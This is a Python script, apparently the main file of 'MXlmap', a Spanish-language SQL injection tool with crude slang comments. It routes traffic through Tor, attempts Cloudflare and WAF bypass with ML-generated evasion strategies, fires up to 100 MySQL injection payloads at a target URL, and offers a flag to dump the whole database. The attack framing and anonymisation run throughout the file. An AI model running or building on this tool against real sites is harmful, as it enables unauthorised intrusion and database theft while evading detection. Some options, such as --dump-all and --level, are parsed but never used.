#!/usr/bin/env python3
import sys
import argparse
from core.output import banner, print_status
from core.cloudflare_bypass import CloudflareBypass
from core.tor_manager import TorManager
from core.payloads.payload_manager import PayloadManager
from core.waf_detector_ml import WAFDetectorML
from core.pdf_report import PDFExporter
import requests

class MXlmap:
    def __init__(self):
        self.version = "2.0.0"
        self.vulnerabilities = []
        self.tor_enabled = False
        self.tor_manager = None
        self.cf_bypass = None
        self.payload_manager = PayloadManager()
        self.waf_detector = WAFDetectorML()
        
    def main(self):
        banner()
        args = self.parse_arguments()
        
        # Configurar Tor si se solicita
        if args.tor:
            print_status("Activando modo anónimo con Tor", "INFO")
            self.tor_manager = TorManager()
            self.tor_enabled = True
        
        # Configurar sesión
        session = requests.Session()
        if self.tor_enabled and self.tor_manager:
            session = self.tor_manager.session
        
        # Bypass Cloudflare
        self.cf_bypass = CloudflareBypass(session)
        response = self.cf_bypass.detect_and_bypass(args.url)
        
        if response:
            # Detectar WAF con ML
            waf_type = self.waf_detector.predict_waf(response)
            print_status(f"WAF detectado: {waf_type}", "INFO")
            
            # Generar estrategias
            strategies = self.waf_detector.generate_bypass_strategy(waf_type)
            for strat in strategies:
                print_status(f"Estrategia: {strat}", "WARNING")
        
        # Escaneo con payloads chingones
        print_status("Iniciando escaneo con 100+ payloads", "INFO")
        
        # Probar payloads
        for i, payload in enumerate(self.payload_manager.get_all_mysql_payloads()[:100]):
            test_url = args.url + payload
            try:
                resp = session.get(test_url, timeout=5)
                if any(err in resp.text.lower() for err in ["mysql", "sql", "syntax"]):
                    vuln = {
                        'type': 'SQL Injection',
                        'severity': 'Critical',
                        'payload': payload
                    }
                    self.vulnerabilities.append(vuln)
                    print_status(f"🔥 Vulnerabilidad encontrada con payload: {payload[:50]}", "SUCCESS")
            except:
                continue
        
        # Generar reporte PDF
        if self.vulnerabilities and args.report:
            print_status("Generando reporte PDF bien verga", "INFO")
            exporter = PDFExporter(args.url, self.vulnerabilities)
            exporter.generate()
        
        print_status(f"Escaneo completado. {len(self.vulnerabilities)} vulnerabilidades encontradas", "SUCCESS")
    
    def parse_arguments(self):
        parser = argparse.ArgumentParser(description='MXlmap - SQLi Tool más verga')
        parser.add_argument('-u', '--url', required=True, help='URL objetivo')
        parser.add_argument('--level', choices=['normal', 'berserker', 'stealth'], default='normal')
        parser.add_argument('--dump-all', action='store_true', help='Extraer toda la DB')
        parser.add_argument('--tor', action='store_true', help='Usar Tor para anonimato')
        parser.add_argument('--report', action='store_true', help='Generar reporte PDF')
        parser.add_argument('--bypass-cf', action='store_true', help='Bypass Cloudflare automático')
        return parser.parse_args()

if __name__ == "__main__":
    tool = MXlmap()
    tool.main()
